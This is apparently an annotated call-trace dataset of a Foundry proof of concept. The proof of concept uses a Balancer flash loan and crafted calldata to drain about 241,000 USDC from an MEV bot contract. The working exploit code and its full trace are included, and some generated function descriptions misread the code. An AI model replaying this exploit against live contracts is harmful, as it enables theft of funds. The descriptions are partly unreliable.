@@ -1,0 +1,303 @@
+[
+    {
+        "id": "419307",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"\\n[Start] Attacker WETH balance before exploit\", WETH_TOKEN.balanceOf(address(this)), 18\n        );\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH_TOKEN);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 1;\n        // Not really know how this byte calldata works\n        bytes memory userData = bytes.concat(\n            abi.encode(\n                0x0000000000000000000000000000000000000000000000000000000000000080,\n                0x0000000000000000000000000000000000000000000000000000000000000100,\n                0x0000000000000000000000000000000000000000000000000000000000000280,\n                0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a551,\n                0x0000000000000000000000000000000000000000000000000000000000000003,\n                address(WETH_TOKEN),\n                address(USDC_TOKEN),\n                address(WETH_TOKEN),\n                0x0000000000000000000000000000000000000000000000000000000000000002,\n                0x0000000000000000000000000000000000000000000000000000000000000040,\n                0x00000000000000000000000000000000000000000000000000000000000000c0\n            ),\n            abi.encode(\n                0x0000000000000000000000000000000000000000000000000000000000000060,\n                0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a,\n                0x2e9eb0ce3606eb48000000000000000000000000000000000000000000000000,\n                0x0000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f5640,\n                0x0000000000000000000000000000000000000000000000000000000000000064,\n                0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f,\n                0x27ead9083c756cc2000000000000000000000000000000000000000000000000,\n                // original: 0x000000000000003d539801af4b77c789fa35b54dacb5f6bb2daaa01554299d6c,\n                // 3d539801af + address(EXPLOIT_CONTRACT)\n                // PoC: 0x000000000000003d539801af7FA9385bE102ac3EAc297483Dd6233D62b3e1496\n                // 3d539801af + address(EXPLOIT_CONTRACT)\n                0x000000000000003d539801af7FA9385bE102ac3EAc297483Dd6233D62b3e1496,\n                0x26f2000000000000000000000000000000000000000000000000000000000000,\n                0x0000000000000000000000000000000000000000000000000000000000000002,\n                0x0000000000000000000000000000000000000000000000000000000000000008,\n                0x0000000000000000000000000000000000000000000000000000000000000000\n            )\n        );\n        BALANCER_VAULT.flashLoan(MEV_BOT, tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\n            \"\\tAttacker USDC balance during the exploit...\", USDC_TOKEN.balanceOf(address(this)), 6\n        );\n\n        // Exchanging all USDC for WETH\n        USDC_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);\n        _USDCToWETH();\n\n        emit log_named_decimal_uint(\n            \"\\n[End] Attacker WETH balance after exploit\", WETH_TOKEN.balanceOf(address(this)), 18\n        );\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function is designed to simulate an attack on a DeFi system using a flash loan. It starts by checking the attacker's WETH (Wrapped Ether) balance before the exploit. Then, it sets up a flash loan request from a Balancer Vault, specifying the tokens and amounts to borrow. After executing the flash loan, it checks the attacker's USDC balance during the exploit. Finally, it converts all USDC back to WETH and logs the attacker's final WETH balance after the exploit.\n\n2. **Security mechanism**:  \n   The function does not explicitly include security mechanisms like access control or input validation. However, it uses `emit` statements to log key data points (e.g., balances) for monitoring and debugging purposes. The flash loan itself relies on the Balancer Vault's internal security measures to ensure the loan is repaid within the same transaction. Additionally, the function uses `type(uint256).max` to approve the maximum possible amount for the USDC-to-WETH swap, which is a common practice but could be risky if not handled carefully.\n\n3. **Parameter Function**:  \n   - `tokens`: An array of token addresses to borrow in the flash loan. Here, it only includes WETH.  \n   - `amounts`: An array of amounts corresponding to the tokens to borrow. Here, it specifies 1 unit of WETH.  \n   - `userData`: A byte array containing encoded data for the flash loan. This is used to pass additional information or instructions to the flash loan receiver (e.g., the MEV bot). The exact structure and purpose of this data are not clearly explained in the code.  \n\n4. **Return description**:  \n   The function does not return any value. Instead, it uses `emit` statements to log the attacker's WETH and USDC balances at different stages of the exploit. These logs help track the changes in the attacker's holdings before, during, and after the exploit. The final WETH balance is calculated by converting all USDC obtained during the exploit back into WETH using a swap function (`_USDCToWETH`).\n\n**In summary**, the `testExploit` function simulates a flash loan attack by borrowing WETH, executing an exploit, and converting the proceeds back to WETH. It logs key balance changes for monitoring but lacks explicit security measures beyond the flash loan's inherent repayment requirement.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "279581",
+        "args": "MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [1], 0x00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000a2d7f7bb876b5a5510000000000000000000000000000000000000000000000000000000000000003000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000060c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f56400000000000000000000000000000000000000000000000000000000000000064a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000003d539801af7fa9385be102ac3eac297483dd6233d62b3e149626f2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "BALANCER_VAULT: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "160620508572947813346540 [1.606e23]"
+    },
+    {
+        "id": "2350",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "10862",
+        "args": "MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "241115",
+        "args": "[0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [1], [0], 0x00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000a2d7f7bb876b5a5510000000000000000000000000000000000000000000000000000000000000003000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000060c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f56400000000000000000000000000000000000000000000000000000000000000064a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000003d539801af7fa9385be102ac3eac297483dd6233d62b3e149626f2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "238044",
+        "args": "[0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [1], [0], 0x00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000a2d7f7bb876b5a5510000000000000000000000000000000000000000000000000000000000000003000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000060c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f56400000000000000000000000000000000000000000000000000000000000000064a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000000000000000000003d539801af7fa9385be102ac3eac297483dd6233d62b3e149626f2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "838",
+        "args": "0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000002d0037e6e417baef5adc0d521dd127e724279bfe"
+    },
+    {
+        "id": "1352",
+        "args": "0x7fa9385be102ac3eac297483dd6233d62b3e149626f20000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496"
+    },
+    {
+        "id": "25162",
+        "args": "0x2D0037e6E417baeF5adc0D521DD127E724279BfE, 187745915823040341329 [1.877e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "158159",
+        "args": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a2e9eb0ce3606eb487fa9385be102ac3eac297483dd6233d62b3e1496000000000000000a2d7f7bb876b5a55188e6a0c2ddd26feeb64f039a2c41296fcb3f5640",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000003825dd436e"
+    },
+    {
+        "id": "129360",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 187745915823040341329 [1.877e20], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
+        "original_code": "    function swap(uint256, uint256, address, bytes calldata) external pure {\n        return;\n    }\n\n    /**\n     * Auxiliary function to swap all USDC to WETH\n     */\n",
+        "description": "1. Core functions:  \nThe `swap` function appears to be a placeholder or a dummy function that does not perform any actual swapping or transaction logic. It is marked as `pure`, meaning it does not read or modify the state of the blockchain. Its primary role seems to be to define a function signature that could be used or overridden in a more complex implementation. The comment suggests it is intended to swap USDC (a stablecoin) to WETH (Wrapped Ether), but the current implementation does not execute any such logic.\n\n2. Security mechanism:  \nThe function is marked as `external`, meaning it can only be called from outside the contract, and `pure`, which ensures it does not interact with the contract\u2019s state or external contracts. These modifiers provide a basic level of security by preventing unintended state changes or external interactions. However, since the function does nothing, there are no additional security mechanisms in place.\n\n3. Parameter Function:  \nThe function takes four parameters:  \n- Two `uint256` values, which could represent amounts or identifiers for the swap.  \n- An `address` parameter, which might specify the recipient or the contract involved in the swap.  \n- A `bytes calldata` parameter, which could be used to pass additional data or instructions.  \nThese parameters are not used in the current implementation, but they suggest the function is designed to handle swap-related inputs in a more complete version.\n\n4. Return description:  \nThe function does not return any value. It simply exits immediately with a `return` statement, indicating it is a no-op (no operation) function.  \n\nIn summary, the `swap` function is a placeholder that does not perform any actual swapping logic. It is designed to be called externally and does not interact with the contract\u2019s state. The parameters suggest it is intended for swap operations, but the current implementation does not utilize them or return any value.",
+        "return_value": "-241153426286 [-2.411e11], 187745915823040341329 [1.877e20]"
+    },
+    {
+        "id": "44017",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 241153426286 [2.411e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "36728",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 241153426286 [2.411e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2534",
+        "args": "WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]",
+        "original_code": null,
+        "description": null,
+        "return_value": "82903723533842235608840 [8.29e22]"
+    },
+    {
+        "id": "9664",
+        "args": "-241153426286 [-2.411e11], 187745915823040341329 [1.877e20], 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6062",
+        "args": "WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 187745915823040341329 [1.877e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]",
+        "original_code": null,
+        "description": null,
+        "return_value": "83091469449665275950169 [8.309e22]"
+    },
+    {
+        "id": "13101",
+        "args": "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000a47b1298f18cf67de547bbe0d723f00000000000000000000003825dd436e7fa9385be102ac3eac297483dd6233d62b3e149626f20000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000a008b92815c3068e6"
+    },
+    {
+        "id": "6478",
+        "args": "",
+        "original_code": "    function getReserves() external view returns (uint112, uint112, uint32) {\n        return WETH_USDC_PAIR_SUSHI.getReserves();\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `getReserves` function is designed to retrieve the current reserves of a specific trading pair (WETH and USDC) from a decentralized exchange platform called SushiSwap. Reserves refer to the amounts of each token held in the trading pair's liquidity pool. This function helps users or other contracts check the available liquidity for these tokens.\n\n2. **Security mechanism**:  \n   The function uses the `external` and `view` modifiers. The `external` modifier ensures the function can only be called from outside the contract, preventing internal misuse. The `view` modifier indicates that the function does not modify the state of the blockchain, making it read-only and gas-efficient. These measures ensure the function is safe to use without risking unintended changes to the contract or blockchain state.\n\n3. **Parameter Function**:  \n   The function does not take any parameters. It directly interacts with a predefined trading pair (`WETH_USDC_PAIR_SUSHI`) to fetch the reserves. This simplicity ensures that the function is straightforward and easy to use without requiring additional input from the caller.\n\n4. **Return description**:  \n   The function returns three values: two `uint112` values representing the reserves of WETH and USDC in the liquidity pool, and a `uint32` value indicating the timestamp of the last update to the reserves. These values are fetched directly from the SushiSwap pair contract, providing real-time information about the liquidity pool.\n\n**In summary**, the `getReserves` function is a simple, read-only tool to check the current reserves of a WETH-USDC trading pair on SushiSwap. It is secure, efficient, and does not require any input parameters, making it easy to use for anyone needing liquidity information.",
+        "return_value": "20359275168577 [2.035e13], 15808279772427860813156 [1.58e22], 1665689507 [1.665e9]"
+    },
+    {
+        "id": "2517",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "20359275168577 [2.035e13], 15808279772427860813156 [1.58e22], 1665689507 [1.665e9]"
+    },
+    {
+        "id": "1050",
+        "args": "0, 184506726843153410278 [1.845e20], MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "MEV_BOT: [0x00000000000A47b1298f18Cf67de547bbE0D723F]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1"
+    },
+    {
+        "id": "3262",
+        "args": "BALANCER_VAULT: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "BALANCER_VAULT: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "160620508572947813346540 [1.606e23]"
+    },
+    {
+        "id": "1315",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "241153426286 [2.411e11]"
+    },
+    {
+        "id": "529",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "241153426286 [2.411e11]"
+    },
+    {
+        "id": "27867",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "27078",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1315",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "241153426286 [2.411e11]"
+    },
+    {
+        "id": "529",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "241153426286 [2.411e11]"
+    },
+    {
+        "id": "72364",
+        "args": "ExactInputSingleParams({ tokenIn: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, tokenOut: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, fee: 500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1665689963 [1.665e9], amountIn: 241153426286 [2.411e11], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }",
+        "original_code": null,
+        "description": null,
+        "return_value": "187558267883820309081 [1.875e20]"
+    },
+    {
+        "id": "67432",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 241153426286 [2.411e11], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "241153426286 [2.411e11], -187558267883820309081 [-1.875e20]"
+    },
+    {
+        "id": "23162",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 187558267883820309081 [1.875e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1315",
+        "args": "WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]",
+        "original_code": null,
+        "description": null,
+        "return_value": "40559875262195 [4.055e13]"
+    },
+    {
+        "id": "529",
+        "args": "WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]",
+        "original_code": null,
+        "description": null,
+        "return_value": "40559875262195 [4.055e13]"
+    },
+    {
+        "id": "10048",
+        "args": "241153426286 [2.411e11], -187558267883820309081 [-1.875e20], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002ba0b86991c6218b36c1d19d4a2e9eb0ce3606eb480001f4c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5992",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 241153426286 [2.411e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "5197",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640], 241153426286 [2.411e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1315",
+        "args": "WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]",
+        "original_code": null,
+        "description": null,
+        "return_value": "40801028688481 [4.08e13]"
+    },
+    {
+        "id": "529",
+        "args": "WETH_USDC_POOL_3: [0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640]",
+        "original_code": null,
+        "description": null,
+        "return_value": "40801028688481 [4.08e13]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "187558267883820309081 [1.875e20]"
+    }
+]
